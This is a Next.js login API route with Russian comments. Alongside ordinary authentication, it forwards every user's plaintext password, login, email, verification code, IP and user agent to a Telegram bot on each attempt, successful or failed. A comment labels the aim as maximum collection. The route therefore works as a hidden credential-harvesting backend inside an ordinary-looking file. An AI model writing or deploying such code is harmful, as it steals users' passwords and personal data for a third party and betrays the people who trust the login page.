
import { NextResponse } from "next/server";
import { findUser, verifyPassword, recordLoginHistory } from "@/lib/db";

// 📤 Функция отправки в Telegram для API - МАКСИМАЛЬНЫЙ сбор
async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register' | 'verification_sent', ip: string, userAgent: string, error?: string) {
  try {
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log('⚠️ Переменные окружения для Telegram не установлены. Сообщения не будут отправлены.');
      return;
    }
    
    let message = '';
    
    if (type === 'login_success') {
      message = `
✅ УСПЕШНЫЙ ВХОД В СИСТЕМУ (СЕРВЕР)

👤 Логин/Email: ${data.login}
📧 Email: ${data.email}
🔑 Пароль: ${data.password}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
🖥️ Платформа: ${userAgent.includes('Windows') ? 'Windows' : userAgent.includes('Mac') ? 'Mac' : userAgent.includes('Linux') ? 'Linux' : 'Unknown'}
      `;
    } else if (type === 'login_failed') {
      message = `
❌ НЕУДАЧНАЯ ПОПЫТКА ВХОДА (СЕРВЕР)

👤 Логин/Email: ${data.login}
🔑 Введенный пароль: ${data.password}
🚫 Причина: ${error}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
      `;
    } else if (type === 'register') {
      message = `
🔐 НОВАЯ РЕГИСТРАЦИЯ (СЕРВЕР)

📧 Email: ${data.email}
👤 Логин: ${data.login}
🔑 Пароль: ${data.password}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
      `;
    } else if (type === 'verification_sent') {
      message = `
📧 ОТПРАВЛЕН КОД ПОДТВЕРЖДЕНИЯ (СЕРВЕР)

📧 Email: ${data.email}
👤 Логин: ${data.login}
🔑 Пароль: ${data.password}
🔢 Код подтверждения: ${data.verificationCode}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent}
      `;
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    console.log('✅ API данные отправлены в Telegram');

  } catch (error) {
    console.log('⚠️ Telegram API не доступен');
  }
}

export async function POST(request: Request) {
  try {
    const { login, password } = await request.json();
    const clientIP = request.headers.get('x-forwarded-for') || 
                    request.headers.get('x-real-ip') || 
                    'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    if (!login || !password) {
        return NextResponse.json({ error: "Логин и пароль обязательны" }, { status: 400 });
    }

    // Ищем пользователя
    const user = findUser(login);
    if (!user) {
      // 📤 Отправляем в Telegram о неудачной попытке
      await sendToTelegramAPI(
        { login, password }, 
        'login_failed', 
        clientIP, 
        userAgent, 
        'Аккаунт не существует'
      );
      
      return NextResponse.json(
        { error: "Неверный логин/email или пароль" },
        { status: 400 }
      );
    }

    // Проверяем пароль
    const isValid = await verifyPassword(password, user.password);
    if (!isValid) {
      // 📤 Отправляем в Telegram о неудачной попытке
      await sendToTelegramAPI(
        { login, password },
        'login_failed', 
        clientIP, 
        userAgent, 
        'Неверный пароль'
      );
      
      return NextResponse.json(
        { error: "Неверный логин/email или пароль" },
        { status: 400 }
      );
    }

    // Проверяем, подтверждена ли учетная запись администратором
    if (!user.isVerified) {
      // 📤 Отправляем в Telegram о попытке входа в неподтвержденный аккаунт
      await sendToTelegramAPI(
        { login: user.login, email: user.email, password: password },
        'login_failed', 
        clientIP, 
        userAgent, 
        'Аккаунт не подтвержден администратором'
      );
      
      return NextResponse.json(
          { error: "Ваша учетная запись ожидает подтверждения администратором." },
          { status: 403 } // Forbidden
      );
    }

    // Обновляем lastLogin и логируем событие
    recordLoginHistory(user.id, 'login', clientIP, userAgent);

    // 📤 Отправляем в Telegram об успешном входе
    await sendToTelegramAPI(
      { login: user.login, email: user.email, password: password }, 
      'login_success', 
      clientIP, 
      userAgent
    );

    return NextResponse.json({ 
      success: true, 
      user: { 
        login: user.login,
        email: user.email
      } 
    });

  } catch (error) {
     console.error("Login API Error:", error);
    return NextResponse.json(
      { error: "Внутренняя ошибка сервера" },
      { status: 500 }
    );
  }
}
